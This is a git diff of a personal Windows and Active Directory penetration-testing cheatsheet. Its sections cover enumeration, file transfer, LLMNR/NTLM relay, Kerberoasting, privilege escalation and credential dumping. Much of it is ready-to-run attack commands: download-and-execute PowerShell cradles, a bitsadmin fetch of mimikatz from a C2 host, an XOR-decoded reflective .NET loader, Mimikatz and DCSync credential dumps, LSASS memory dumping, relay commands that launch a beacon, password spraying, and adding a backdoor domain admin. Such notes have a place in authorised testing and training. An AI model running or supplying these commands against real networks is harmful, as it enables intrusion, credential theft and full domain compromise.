@@ -3,15 +3,13 @@ title: Windows Notes / Cheatsheet
 published: true
 ---
 
+# [](#header-1)Windows Notes / Cheatsheet
 
-
-> A place for me to store my notes/tricks for Windows Based Systems. 
->
-> Note: These notes are heavily based off other articles, cheat sheets and guides etc. I just wanted a central place to store the best ones.
+A place for me to store my notes/tricks for Windows Based Systems. 
 
 
 
-**Note: These notes are heavily based off other articles, cheat sheets and guides etc. I just wanted a central place to store the best ones.**
+Note: These notes are heavily based off other articles, cheat sheets and guides etc. I just wanted a central place to store the best ones.
 
 ## [](#header-2)Enumeration
 
@@ -19,7 +17,7 @@ published: true
 
 Basic's
 
-```powershell
+```
 net users
 net users /domain
 net localgroup
@@ -31,25 +29,16 @@ Get-Domain
 Get-DomainUser
 Get-DomainGroup
 Get-DomainGroupMember -identity "Domain Admins" -Domain m0chanAD.local -DomainController 10.10.14.10
-Find-DomainShare
-
-
-#Host Discovery
 netdiscover -r subnet/24
-nbtscan -r [range]
-for /L %i in (1,1,255) do  @ping.exe -n 1 -w 50 <10.10.10>.%i | findstr TTL
-
-
-#Reverse DNS Lookup
-$ComputerIPAddress = "10.10.14.14"
-[System.Net.Dns]::GetHostEntry($ComputerIPAddress).HostName
+Find-DomainShare
+Get-DomainFileServer
 ```
 
-https://github.com/tevora-threat/SharpView
+
 
 Users with SPN
 
-```powershell
+```
 Get-DomainUser -SPN
 
 Get-ADComputer -filter {ServicePrincipalName -like <keyword>} -Properties OperatingSystem,OperatingSystemVersion,OperatingSystemServicePack,
@@ -60,7 +49,7 @@ PasswordLastSet,LastLogonDate,ServicePrincipalName,TrustedForDelegation,Trustedt
 
 Kerberos Enumeration
 
-```powershell
+```
 nmap $TARGET -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='test'
 ```
 
@@ -68,118 +57,68 @@ nmap $TARGET -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm=
 
 Active Directory
 
-```powershell
+```
 nltest /DCLIST:DomainName
 nltest /DCNAME:DomainName
 nltest /DSGETDC:DomainName
 
-# Get Current Domain Info - Similar to Get-Domain
+# current domain info
 [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
 
-# Get Domain Trust Info - Similar to Get-DomainTrust
+# domain trusts
 ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()
 
-# View Domain Info
+# current forest info
 [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
 
-#  View Domain Trust Information
+# get forest trust relationships
 ([System.DirectoryServices.ActiveDirectory.Forest]::GetForest((New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', 'forest-of-interest.local')))).GetAllTrustRelationships()
 
-nltest [server:<fqdn_foreign_domain>] /domain_trusts /all_trusts /v
-
-nltest /dsgetfti:<domain>
-
-nltest /server:<ip_dc> /domain_trusts /all_trusts
-
-([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()
-
-# View All Domain Controllers
+# get DCs of a domain
 nltest /dclist:offense.local
 net group "domain controllers" /domain
 
-# View DC for Current Session
-nltest /dsgetdc:m0chanAD.local
+# get DC for currently authenticated session
+nltest /dsgetdc:offense.local
 
-# View Domain Trusts from CMD
+# get domain trusts from cmd shell
 nltest /domain_trusts
 
-# View User Info from CMD
-nltest /user:"m0chan"
+# get user info
+nltest /user:"spotless"
+
+# get DC for currently authenticated session
+set l
 
 # get domain name and DC the user authenticated to
 klist
 
-# Get All Logged on Sessions, Includes NTLM & Kerberos
+# get all logon sessions. Includes NTLM authenticated sessions
 klist sessions
 
-# View Kerb Tickets
+# kerberos tickets for the session
 klist
 
-# View Cached Krbtgt
+# cached krbtgt
 klist tgt
 
 # whoami on older Windows systems
 set u
 
-#List all Usernames
-([adsisearcher]"(&(objectClass=User)(samaccountname=*))").FindAll().Properties.samaccountname
-
-#List Administrators
-
-([adsisearcher]"(&(objectClass=User)(admincount=1))").FindAll().Properties.samaccountname
-
-#List all Info about Specific User
-
-([adsisearcher]"(&(objectClass=User)(samaccountname=<username>))").FindAll().Properties
-
-#View All Users with Description Field Set
-
-([adsisearcher]"(&(objectClass=group)(samaccountname=*))").FindAll().Properties | % { Write-Host $_.samaccountname : $_.description }
-```
+# Forest information
+[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
+# Domain information
+[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
 
 
-
-SharpView Enumeration
-
-```powershell
-#https://github.com/tevora-threat/SharpView
-
-Get-DomainFileServer
-Get-DomainGPOUserLocalGroupMapping
-Find-GPOLocation
-Get-DomainGPOComputerLocalGroupMapping
-Find-GPOComputerAdmin
-Get-DomainObjectAcl
-Get-ObjectAcl
-Add-DomainObjectAcl
-Add-ObjectAcl
-Remove-DomainObjectAcl
-Get-RegLoggedOn
-Get-LoggedOnLocal
-Get-NetRDPSession
-Test-AdminAccess
-Invoke-CheckLocalAdminAccess
-Get-WMIProcess
-Get-NetProcess
-Get-WMIRegProxy
-Get-Proxy
-Get-WMIRegLastLoggedOn
-Get-LastLoggedOn
-Get-WMIRegCachedRDPConnection
-Get-CachedRDPConnection
-Get-WMIRegMountedDrive
-Get-RegistryMountedDrive
-Find-InterestingDomainAcl
-Invoke-ACLScanner
-Get-NetShare
-Get-NetLoggedon
+Shout out to XTC (vulndev.io) for the above trick.
 ```
 
 
 
 SMB Enumeration
 
-```powershell
+```
 nmap -p 139,445 --script smb.nse,smb-enum-shares,smbls
 enum4linux 1.3.3.7
 smbmap -H 1.3.3.7
@@ -190,17 +129,13 @@ smbclient \\\\INSERTIPADDRESS\\ipc$ -U john
 smbclient //INSERTIPADDRESS/ipc$ -U john
 smbclient //INSERTIPADDRESS/admin$ -U john
 nbtscan [SUBNET]
-
-
-#Check for SMB Signing
-nmap --script smb-security-mode.nse -p 445 10.10.14.14 
 ```
 
 
 
 SNMP Enumeration
 
-```powershell
+```
 snmpwalk -c public -v1 10.10.14.14
 snmpcheck -t 10.10.14.14 -c public
 onesixtyone -c names -i hosts
@@ -212,7 +147,7 @@ snmpenum -t 10.10.14.14
 
 MySQL Enumeration
 
-```powershell
+```
 nmap -sV -Pn -vv  10.0.0.1 -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122
 ```
 
@@ -220,7 +155,7 @@ nmap -sV -Pn -vv  10.0.0.1 -p 3306 --script mysql-audit,mysql-databases,mysql-du
 
 DNS Zone Transfer
 
-```powershell
+```
 dig axfr blah.com @ns1.m0chan.com
 nslookup -> set type=any -> ls -d m0chan.com
 dnsrecon -d m0chan -D /usr/share/wordlists/dnsmap.txt -t std --xml ouput.xml
@@ -228,34 +163,17 @@ dnsrecon -d m0chan -D /usr/share/wordlists/dnsmap.txt -t std --xml ouput.xml
 
 
 
-LDAP
-
-```
-ldapsearch -H ldap://<ip>
-ldapwhoami
-```
-
 
 
 RPC Enumeration
 
-```powershell
+```
 rpcclient -U "10.10.14.14"
-srvinfo
-enumdomusers
-enumalsgroups domain
-lookupnames administrators
-querydominfo
-enumdomusers
-queryuser <user>
-lsaquery
-lookupnames Guest
-lookupnames Administrator
 ```
 
 Remote Desktop
 
-```powershell
+```
 rdesktop -u guest -p guest INSERTIPADDRESS -g 94%
 
 # Brute force
@@ -270,12 +188,17 @@ ncrack -vv --user Administrator -P /root/oscp/passwords.txt rdp://INSERTIPADDRES
 
 TFTP
 
-```powershell
+```
 m0chan Machine
+
 mkdir tftp
+
 atftpd --deamon --port 69 tftp
+
 cp *file* tftp
+
 On victim machine:
+
 tftp -i <[IP]> GET <[FILE]>
 ```
 
@@ -283,62 +206,27 @@ tftp -i <[IP]> GET <[FILE]>
 
 FTP
 
-```powershell
-echo open <[IP]> 21 > ftp.txt
-echo USER demo >> ftp.txt
-echo ftp >> ftp.txt
-echo bin >> ftp.txt
-echo GET nc.exe >> ftp.txt
-echo bye >> ftp.txt
-ftp -v -n -s:ftp.txt
 ```
+echo open <[IP]> 21 > ftp.txt
 
+echo USER demo >> ftp.txt
 
+echo ftp >> ftp.txt
 
-VBS Script
+echo bin >> ftp.txt
 
-```powershell
-echo strUrl = WScript.Arguments.Item(0) > wget.vbs
-echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
-echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
-echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
-echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
-echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
-echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts >> wget.vbs
-echo Err.Clear >> wget.vbs
-echo Set http = Nothing >> wget.vbs
-echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
-echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
-echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
-echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
-echo http.Open "GET",strURL,False >> wget.vbs
-echo http.Send >> wget.vbs
-echo varByteArray = http.ResponseBody >> wget.vbs
-echo Set http = Nothing >> wget.vbs
-echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
-echo Set ts = fs.CreateTextFile(StrFile,True) >> wget.vbs
-echo strData = "" >> wget.vbs
-echo strBuffer = "" >> wget.vbs
-echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
-echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) >> wget.vbs
-echo Next >> wget.vbs
-echo ts.Close >> wget.vbs
+echo GET nc.exe >> ftp.txt
 
+echo bye >> ftp.txt
 
-
-cscript wget.vbs <url> <out_file>
-
-Use echoup function on pentest.ws to generate echo commands.
-https://pentest.ws/features
+ftp -v -n -s:ftp.txt
 ```
 
 
 
 Powershell
 
-```powershell
-#https://github.com/danielbohannon/Invoke-CradleCrafter Use this to craft obsufacted cradles
-
+```
 Invoke-WebRequest "https://server/filename" -OutFile "C:\Windows\Temp\filename"
 
 (New-Object System.Net.WebClient).DownloadFile("https://server/filename", "C:\Windows\Temp\filename") 
@@ -358,7 +246,7 @@ IEX($browser.DownloadString('https://server/script.ps1'));
 
 Powershell Base64
 
-```powershell
+```
 $fileName = "Passwords.kdbx"
 $fileContent = get-content $fileName
 $fileContentBytes = [System.Text.Encoding]::UTF8.GetBytes($fileContent)
@@ -368,44 +256,9 @@ $fileContentEncoded | set-content ($fileName + ".b64")
 
 
 
-Secure Copy / pscp.exe
-
-```
-pscp.exe C:\Users\Public\m0chan.txt user@target:/tmp/m0chan.txt
-pscp.exe user@target:/home/user/m0chan.txt C:\Users\Public\m0chan.txt
-```
-
-
-
-BitsAdmin.exe
-
-```
-cmd.exe /c "bitsadmin.exe /transfer downld_job /download /priority high http://c2.m0chan.com C:\Temp\mimikatz.exe & start C:\Temp\binary.exe"
-```
-
-
-
-Remote Desktop
-
-```
-rdesktop 10.10.10.10 -r disk:linux='/home/user/filetransferout'
-```
-
-
-
-WinHTTP Com Object
-
-```
-[System.Net.WebRequest]::DefaultWebProxy
-[System.Net.CredentialCache]::DefaultNetworkCredentials
-$h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET','http://EVIL/evil.ps1',$false);$h.send();iex $h.responseText
-```
-
-
-
 CertUtil
 
-```powershell
+```
 #File Transfer
 
 certutil.exe -urlcache -split -f https://m0chan:8888/filename outputfilename
@@ -420,7 +273,7 @@ certutil.exe -decode encodedInputFileName decodedOutputFileName
 
 Curl (Windows 1803+)
 
-```powershell
+```
 curl http://server/file -o file
 curl http://server/file.bat | cmd
 
@@ -431,7 +284,7 @@ IEX(curl http://server/script.ps1);Invoke-Blah
 
 SMB
 
-```powershell
+```
 python smbserver.py Share `pwd` -u m0chan -p m0chan --smb-2support
 ```
 
@@ -443,22 +296,26 @@ python smbserver.py Share `pwd` -u m0chan -p m0chan --smb-2support
 
 LLMNR / NBT-NS Spoofing
 
-```powershell
+```
 #Responder to Steal Creds
 
 git clone https://github.com/SpiderLabs/Responder.git python Responder.py -i local-ip -I eth0
 
 
-LLMNR and NBT-NS is usually on by default and there purpose is to act as a fallback to DNS. i/e if you search \\HRServer\ but it dosent exist, Windows (by default) will send out a LLMNR broadcast across the network. By using Responder we can respond to these broadcasts and say something like
+#Spoof / poison LLMNR / NetBIOS requests:
+auxiliary/spoof/llmnr/llmnr_response
+auxiliary/spoof/nbns/nbns_response
 
-'Yeah I'm HRServer, authenticate to me and I will get a NTLMv2 hash which I can crack or relay. More on relaying below'
+#Capture the hashes:
+auxiliary/server/capture/smb
+auxiliary/server/capture/http_ntlm
 ```
 
 
 
 Responder WPAD Attack
 
-```powershell
+```
 responder -I eth0 wpad
 
 By default, Windows is configured to search for a Web Proxy Auto-Discovery file when using the internet
@@ -472,7 +329,7 @@ Then take NTLMv2 hash and NTLM Relay it or send to cracking rig.
 
 mitm6
 
-```powershell
+```
 #Use when WPAD attack is not working, this uses IPv6 and DNS to relay creds to a target. 
 
 By default IPV6 should be enabled. 
@@ -486,7 +343,7 @@ Now the vuln occurs, Windows prefers IPV6 over IPv4 meaning DNS = controlled by 
 
 ntlmrelayx.py -wh webserverhostingwpad:80 -t smb://TARGETIP/ -i
 
--i opens an interactive shell.
+-i open's an interactive shell.
 
 Shout out to hausec for this super nice tip.
 
@@ -496,7 +353,7 @@ Shout out to hausec for this super nice tip.
 
 SCF File Attack
 
-```powershell
+```
 Create .scf file and drop inside SMB Share and fire up Responder ;) 
 
 
@@ -513,7 +370,7 @@ Command=ToggleDesktop
 
 NTLM-Relay
 
-```powershell
+```
 Good article explaining differences between NTLM/Net-NTLMV1&V2
 
 https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html
@@ -524,7 +381,6 @@ You CAN perform Pass-The-Hash attacks with NTLM hashes.
 You CANNOT perform Pass-The-Hash attacks with Net-NTLM hashes.
 
 PS: You CANNOT relay a hash back to itself.
-PS: SMB Signing must be disabled to mitigate this, you can check with nmap scan or crackmapexec
 
 crackmapexec smb 10.10.14.0/24 --gene-relay-list targets.txt
 
@@ -537,13 +393,19 @@ How about we execute a command instead.
 
 ntlmrelayx.py -tf targets.txt -c powershell.exe -Enc asdasdasdasd
 ntlmrelayx.py -tf targets.txt -c powershell.exe /c download and execute beacon... = RIP
+
+
+
+You could also couple this with SQLi but executing EXEC xp_cmdshell '' and relaying the response or pop a shell on the web server etc.
 ```
+
+
 
 
 
 Priv Exchange
 
-```powershell
+```
 #https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/
 
 Combine privxchange.py and ntlmrelayx
@@ -556,9 +418,13 @@ python privexchange.py -ah FDQN.m0chanAD.local DOMAINCONTROLLER.m0chanAD.local -
 
 
 
+Password Spraying
+
+
+
 CrackMapExec
 
-```powershell
+```
 CrackMapExec is installed on Kali or get Windows Binary from Github.
 
 Has 3 Execution Methods
@@ -604,68 +470,14 @@ crackmapexec smb 10.10.14.0/24 -u user -p 'Password' --local-auth -M enum_avprod
 
 Mail Sniper
 
-```powershell
+```
 Invoke-PasswordSprayOWA -ExchHostname m0chanAD.local -userlist harvestedUsers.txt -password Summer2019
 
 [*] Now spraying the OWA portal at https://m0chanAD.local/owa/
 
 [*] SUCCESS! User:m0chan:Summer2019
 
-Lmao, you really think Id use the pass Summer2019?
-```
-
-
-
-Kerberos Stuff
-
-```powershell
-#https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a
-#https://m0chan.github.io/Kerberos-Attacks-In-Depth
-```
-
-
-
-MSSQL Exploiting (PowerUpSQL)
-
-```powershell
-#https://github.com/NetSPI/PowerUpSQL
-
-#View SQL Instances
-Get-SQLInstanceDomain [| Get-SQLServerInfo]
-
-#Login in with Domain Account
-Get-SQLConnectionTestThreaded
-
-#Login in with Default Password
-Get-SQLServerDefaultLoginPw
-
-#List DB, Tables & Columns
-
-Get-SQLInstanceDomain | Get-SQLDatabase
-Get-SQLInstanceDomain | Get-SQLTable -DatabaseName <DB_name>
-Get-SQLInstanceDomain | Get-SQLColumn -DatabaseName <DB_name> -TableName <Table_name>
-
-#Search Column Names for Word
-
-Get-SQLInstanceDomain | Get-SQLColumnSampleData -Keywords "<word1,word2>" -Verbose -SampleSize 10
-
-#Try to Execute Commands (RCE)
-
-Invoke-SQLOSCmd
-
-
-#Enable XP_CMDShell Process
-
-EXEC sp_configure 'show advanced options', 1;  
-go  
-RECONFIGURE;  
-go  
-EXEC sp_configure 'xp_cmdshell', 1;  
-go  
-RECONFIGURE;  
-go  
-xp_cmdshell '<cmd>'
-go
+Lmao, you really think I'd use the pass Summer2019?
 ```
 
 
@@ -696,27 +508,9 @@ type C:\Windows\system32\drivers\etc\hosts
 
 
 
-PowerUp.ps1 (Sometimes a Quick Win)
-
-```powershell
-powershell.exe /c IEX(New-Object Net.WebClient).downloadString('webserver/PowerUp.ps1') ;Invoke-AllChecks
-```
-
-
-
-SharpUp
-
-```powershell
-#https://github.com/GhostPack/SharpUp
-
-C Sharp Implementation of PowerUp.ps1 which can be reflectively loaded.
-```
-
-
-
 If It's AD Get Bloodhound Imported...
 
-```powershell
+```
 SharpHound.ps1
 SharpHound.exe -> https://github.com/BloodHoundAD/SharpHound
 
@@ -733,7 +527,7 @@ If you can't exfil the .zip... Find a way ;) I joke, I joke. Output as plain jso
 
 Bloodhound-Python
 
-```python
+```
 git clone https://github.com/fox-it/BloodHound.py.git
 cd BloodHound.py/ && pip install .
 
@@ -744,7 +538,7 @@ bloodhound-python -d m0chanAD.local -u m0chan -p Summer2019 -gc DOMAINCONTROLLER
 
 Cleartext Passwords
 
-```powershell
+```
 # Windows autologin
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
 
@@ -766,7 +560,7 @@ reg query HKCU /f password /t REG_SZ /s
 
 View Installed Software
 
-```powershell
+```
 tasklist /SVC
 net start
 reg query HKEY_LOCAL_MACHINE\SOFTWARE
@@ -785,7 +579,7 @@ Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
 
 Weak Folder Permissions
 
-```powershell
+```
 Full Permissions for 'Everyone' on Program Folders
 
 icacls "C:\Program Files\*" 2>nul | findstr "(F)" | findstr "Everyone"
@@ -807,28 +601,17 @@ icacls "C:\Program Files (x86)\*" 2>nul | findstr "(M)" | findstr "BUILTIN\Users
 
 Scheduled Tasks
 
-```powershell
-schtasks /query /fo LIST /v
 ```
-
-
-
-Powershell History
-
-```powershell
-type C:\Users\m0chan\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
-cat (Get-PSReadlineOption).HistorySavePath
-cat (Get-PSReadlineOption).HistorySavePath | sls passw
+schtasks /query /fo LIST /v
 ```
 
 
 
 View Connected Drives
 
-```powershell
+```
 net use
 wmic logicaldisk get caption,description
-
 Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
 ```
 
@@ -836,7 +619,7 @@ Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| 
 
 View Privs
 
-```powershell
+```
 whoami /priv
 
 Look for SeImpersonate, SeDebugPrivilege etc
@@ -854,7 +637,7 @@ qwinsta
 
 View Registry Auto-Login
 
-```powershell
+```
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"
 
 Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon' | select "Default*"
@@ -864,7 +647,7 @@ Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows 
 
 View Stored Creds in Credential Manager
 
-```powershell
+```
 cmdkey /list
 dir C:\Users\username\AppData\Local\Microsoft\Credentials\
 dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
@@ -877,7 +660,7 @@ Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
 
 View Unquoted Service Paths
 
-```powershell
+```
 wmic service get name,displayname,pathname,startmode 2>nul |findstr /i "Auto" 2>nul |findstr /i /v "C:\Windows\\" 2>nul |findstr /i /v """
 
 gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
@@ -887,7 +670,7 @@ gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Whe
 
 View Startup Items
 
-```powershell
+```
 wmic startup get caption,command
 reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
 reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
@@ -901,19 +684,15 @@ dir "C:\Documents and Settings\%username%\Start Menu\Programs\Startup"
 
 Check for AlwaysInstalledElevated Reg Key
 
-```powershell
+```
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
-Get-ItemProperty HKLM\Software\Policies\Microsoft\Windows\Installer
-Get-ItemProperty HKCU\Software\Policies\Microsoft\Windows\Installer
-reg query HKLM\Software\Policies\Microsoft\Windows\Installer
-reg query HKCU\Software\Policies\Microsoft\Windows\Installer
 ```
 
 
 
 Any Passwords in Registry?
 
-```powershell
+```
 reg query HKCU /f password /t REG_SZ /s
 reg query HKLM /f password /t REG_SZ /s 
 ```
@@ -922,7 +701,7 @@ reg query HKLM /f password /t REG_SZ /s
 
 Any Sysrep or Unattend Files Left Over
 
-```powershell
+```
 dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
 
 Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
@@ -930,67 +709,9 @@ Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAct
 
 
 
-GPP (Group Policy Preferences) Passwords
-
-```
-smbclient //DOMAINCONTROLLER.local/SYSVOL -U m0chan
-
-\m0chanAD.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\USER\Preferences\Groups\
-
-http://www.sec-1.com/blog/wp-content/uploads/2015/05/gp3finder_v4.0.zip - For Decryption
-
-Can also use PowerUP.ps1
-```
-
-
-
-Dump Chrome Passwords (Also Post Exploit)
-
-```powershell
-#git clone https://github.com/rasta-mouse/CookieMonster
-
-CookieMonster creds
-CookieMonster.exe cookies -d [domain] -e 
-CookieMonster -a 
-
-Must be run in the context of the target users as chrome passwords are encrypted with DPAPI.
-
-Can also use Mimikatz for this.
-
-mimikatz dpapi::chrome /in:"C:\Users\m0chan\AppData\Local\Google\Chrome\UserData\Default\Login Data"
-
-mimikatz dpapi::chrome /in:"C:\Users\m0chan\AppData\Local\Google\Chrome\UserData\Default\Login Data" /unprotect
-
-mimikatz dpapi::chrome /in:"C:\Users\m0chan\AppData\Local\Google\Chrome\UserData\Default\Cookies" /unprotect
-```
-
-
-
-Dump KeePass
-
-```powershell
-#https://github.com/HarmJ0y/KeeThief
-#http://www.harmj0y.net/blog/redteaming/keethief-a-case-study-in-attacking-keepass-part-2/
-
-Get-Process keepass
-tasklist | findstr keepass
-
-Attacking KeePass
-
-#https://raw.githubusercontent.com/HarmJ0y/KeeThief/master/PowerShell/KeeThief.ps1
-Import-Module KeeThief.ps1
-Get-KeePassDatabaseKey -Verbose
-
-KeeTheft.exe, Microsoft.Diagnostics.Runtime.dll & KeePatched.exe can also be used.
-```
-
-
-
-
-
 Token Impersonation
 
-```powershell
+```
 https://github.com/PowerShellMafia/PowerSploit/blob/c7985c9bc31e92bb6243c177d7d1d7e68b6f1816/Exfiltration/Invoke-TokenManipulation.ps1
 
 Invoke-TokenManipulation -ImpersonateUser -Username "lab\domainadminuser"
@@ -1004,27 +725,22 @@ Reflectively Load it with Powershell, Cobalt, SilentTrinity etc...
 
 ```
 
-```powershell
+```
 $wc=New-Object System.Net.WebClient;$wc.Headers.Add("User-Agent","Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:49.0) Gecko/20100101 Firefox/49.0");$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;$wc.Proxy.Credentials=[System.Net.CredentialCache]::DefaultNetworkCredentials
 $k="xxxxxxx";$i=0;[byte[]]$b=([byte[]]($wc.DownloadData("https://xxxxx")))|%{$_-bxor$k[$i++%$k.length]}
 [System.Reflection.Assembly]::Load($b) | Out-Null
 $parameters=@("arg1", "arg2")
 [namespace.Class]::Main($parameters)
-
-
-Reflectively Load .NET Assembly within Powershell if you cant do it through your C2 Infra
 ```
 
 
 
 Juicy Potato
 
-```powershell
+```
 #Requires SeImpersonatePrivilege (Typically found on service accounts IIS Service, SQL Service etc)
 
 #Reference https://ohpe.it/juicy-potato/
-
-Requirements: SeAssignPrimaryTokenPrivilege and/or SeImpersonatePrivilege
 
 (new-object System.Net.WebClient).DownloadFile('http://10.10.14.5:8000/JuicyPotato.exe','C:\Program Files\Microsoft SQL Server\MSSQL12.SQLEXPRESS\MSSQL\Backup\JuicyPotato.exe')
 
@@ -1032,8 +748,6 @@ JuicyPotato.exe -l 1337 -p C:\Users\Public\Documents\Mochan.exe -t * -c {5B3E677
 
 Mochan.exe = Payload
 5B3E6773-3A99-4A3D-8096-7765DD11785C = Target CLISD
-
-A CLSID is a GUID that identifies a COM class object
 
 Can also use -A flag to specify arguments alongside cmd.exe/powershell.exe etc
 
@@ -1045,52 +759,19 @@ JUICY POTATO HAS TO BE RAN FROM CMD SHELL AND NOT POWERSHELL
 
 Kerberoasting
 
-```powershell
-#Check my Blog Post Kerberos Attacks in Depth for Further Information
-#https://m0chan.github.io/Kerberos-Attacks-In-Depth
-
-Get-DomainSPNTicket -Credential $cred -OutputFormat hashcat
-
-because Hashcat over John anyday right?
+```
+Get-DomainSPNTicket -Credential $
 
 Invoke-Kerberoast.ps1
 
 python GetUserSPNs.py -request -dc-ip 10.10.14.15 m0chanad.local/serviceaccount
-
-Ofc the above requires access to Port 88 on the DC but you can always port forward if executing GetUserSPNs.py manually.
-
-https://github.com/GhostPack/SharpRoast --NOW Deprecated-- and incorproated into Rebeus with the kerberoast action
-```
-
-
-
-Kerberoast with Python
-
-```powershell
-#https://github.com/skelsec/kerberoast
-
-
-IMPORTANT: the accepted formats are the following
-<ldap_connection_string> : <domainname>/<username>/<secret_type>:<secret>@<DC_ip>
-<kerberos_connection_string>: <kerberos realm>/<username>/<secret_type>:<secret>@<DC_ip>
-
-
-
-Look for vulnerable users via LDAP
-kerberoast ldap all <ldap_connection_string> -o ldapenum
-
-Use ASREP roast against users in the ldapenum_asrep_users.txt file
-kerberoast asreproast <DC_ip> -t ldapenum_asrep_users.txt
-
-Use SPN roast against users in the ldapenum_spn_users.txt file
-kerberoast spnroast <kerberos_connection_string> -t ldapenum_spn_users.txt
 ```
 
 
 
 AS Rep Roasting
 
-```powershell
+```
 #Accounts have to have DONT_REQ_PREAUTH explicitly set for them to be vulnerable
 
 Get-ASRepHash -Domain m0chanAD.local -User victim
@@ -1104,17 +785,12 @@ Can also use Rebeus (Reflectively Load .NET Assembly.)
 
 DCSync (Also Post Exploit)
 
-```powershell
-#Special rights are required to run DCSync. Any member of Administrators, Domain Admins, or Enterprise Admins as well as Domain Controller computer accounts are able to run DCSync to pull password data. Note that Read-Only Domain Controllers are not  allowed to pull password data for users by default. 
-
-#and anyone with the Replicating Changes permissions set to Allow (i.e., Replicating Changes All/Replicating Directory Changes)
+```
+#Special rights are required to run DCSync. Any member of Administrators, Domain Admins, or Enterprise Admins as well as Domain Controller computer accounts are able to run DCSync to pull password data. Note that Read-Only Domain Controllers are not  allowed to pull password data for users by default.
 
 mimikatz # lsadump::dcsync /domain:corp.local /user:Administrator
 
 powershell.exe -Version 2 -Exec Bypass /c "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.6:8000/Invoke-DCSync.ps1'); Invoke-DCSync -PWDumpFormat"
-
-
-Empire Module: powershell/credentials/mimikatz/dcsync_hashdump
 ```
 
 
@@ -1125,7 +801,7 @@ Empire Module: powershell/credentials/mimikatz/dcsync_hashdump
 
 Useful Commands
 
-```powershell
+```
 net user m0chan /add /domain
 net localgroup Administrators m0chan /add
 
@@ -1162,9 +838,9 @@ reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
 
 
 
-Run Seatbelt (ABSOLUTELY MUST)
+Run Seatbelt
 
-```powershell
+```
 #https://github.com/GhostPack/Seatbelt
 
 This is stupidily good, it can literally Enum everything you require and is also a .NET Assembly so can be reflectively loaded to avoid AV :D Win Win
@@ -1208,7 +884,7 @@ And more!!
 
 Dump Creds
 
-```powershell
+```
 (new-object System.Net.WebClient).DownloadString('http://10.10.14.5:8000/Invoke-Mimikatz.ps1');Invoke-Mimikatz 
 
 Can also run Mimikatz.exe after some AV Evasion removing strings etc. ippSec has a great tutorial on this.
@@ -1220,125 +896,32 @@ sekurlsa::logonPasswords full
 The safer method is to dump the process memory of LSASS.exe with MiniDump 
 (https://github.com/3xpl01tc0d3r/Minidump)
 
-(or) https://github.com/GhostPack/SharpDump
-
 and send the .bin to Mimikatz locally.
 
 sekurlsa::minidump C:\users\m0chan\lssas.dmp
 
 Can also be used for dumping and pass the ticket attacks but will cover this elsewhere.
-
-Mimikatz Guide
-
-#Logon Sessions
-
